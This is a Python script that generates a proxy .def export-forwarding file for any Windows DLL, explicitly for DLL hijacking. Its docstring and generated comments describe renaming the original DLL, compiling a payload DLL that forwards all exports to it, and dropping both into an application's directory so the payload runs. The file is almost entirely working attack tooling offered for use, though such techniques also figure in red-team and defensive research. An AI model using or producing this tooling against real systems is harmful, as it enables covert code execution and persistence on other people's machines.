"""
Generate a .def export-forwarding file for ANY DLL.

This creates a complete proxy .def so your hijack DLL forwards all
exports to the original DLL (renamed _orig) while executing your payload.

Usage:
    python -I generate_proxy_def.py --dll "C:\Windows\System32\VERSION.dll" --output VERSION.def
    python -I generate_proxy_def.py --dll "C:\Windows\System32\WINMM.dll" --output WINMM.def

Requirements:
    pip install pefile
"""

import argparse
import os
import sys

try:
    import pefile
except ImportError:
    print("[-] pefile not installed. Install with: pip install pefile")
    print("[*] Or use dumpbin: dumpbin /exports target.dll")
    sys.exit(1)


def generate_def(dll_path: str, output: str):
    dll_name = os.path.splitext(os.path.basename(dll_path))[0]
    orig_name = f"{dll_name}_orig"

    pe = pefile.PE(dll_path)

    if not hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        print(f"[-] No exports found in {dll_path}")
        return

    exports = []
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            exports.append(exp.name.decode("utf-8"))
        elif exp.ordinal:
            exports.append(f"ord{exp.ordinal}")

    with open(output, "w") as f:
        f.write(f"; Auto-generated proxy .def for {dll_name}.dll\n")
        f.write(f"; Forwards all {len(exports)} exports to {orig_name}.dll\n")
        f.write(f";\n")
        f.write(f"; Steps:\n")
        f.write(f";   1. Rename original {dll_name}.dll -> {orig_name}.dll\n")
        f.write(f";   2. Compile payload: gcc -shared -o {dll_name}.dll payload.c {output}\n")
        f.write(f";   3. Place both in the application directory\n\n")
        f.write("EXPORTS\n")
        for exp_name in sorted(exports):
            f.write(f"    {exp_name}={orig_name}.{exp_name}\n")

    print(f"[+] Generated {output} with {len(exports)} exports")
    print(f"[*] Compile: x86_64-w64-mingw32-gcc -shared -o {dll_name}.dll payload.c {output}")


def main():
    parser = argparse.ArgumentParser(description="Generate proxy .def for DLL hijacking")
    parser.add_argument("--dll", required=True, help="Path to the target DLL")
    parser.add_argument("--output", "-o", help="Output .def file (default: <dllname>.def)")
    args = parser.parse_args()

    if not args.output:
        args.output = os.path.splitext(os.path.basename(args.dll))[0] + ".def"

    generate_def(args.dll, args.output)


if __name__ == "__main__":
    main()
